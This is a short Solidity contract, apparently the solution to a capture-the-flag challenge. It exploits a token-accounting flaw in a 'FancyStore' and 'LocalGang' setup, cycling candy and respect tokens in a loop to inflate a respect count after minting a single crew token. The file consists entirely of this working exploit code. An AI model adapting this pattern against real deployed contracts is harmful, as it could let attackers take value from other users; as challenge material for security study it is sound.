// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CandyToken.sol";
import "./RespectToken.sol";
import "./CrewToken.sol";
import "./LocalGang.sol";
import "./FancyStore.sol";
import "./Setup.sol";

contract InfiniteAttack {
    function attack(address target) public {
        Setup setup = Setup(target);
        LocalGang lg = setup.GANG();
        FancyStore fs = setup.STORE();
        CrewToken crew = setup.CREW();
        RespectToken respect = setup.RESPECT();
        CandyToken candy = setup.CANDY();

        crew.mint(); // get 1 crew
        crew.approve(address(fs), 1);
        fs.verification();   // 1 crew -> 10 candy

        candy.approve(address(lg), 50);
        respect.approve(address(fs), 50);
        
        for (uint i; i < 5; i++) {
            lg.gainRespect(10);  // 10 candy -> 10 respect
            fs.buyCandies(10);  // 10 respect -> 10 candy, respectCount += 10
        }
    }
}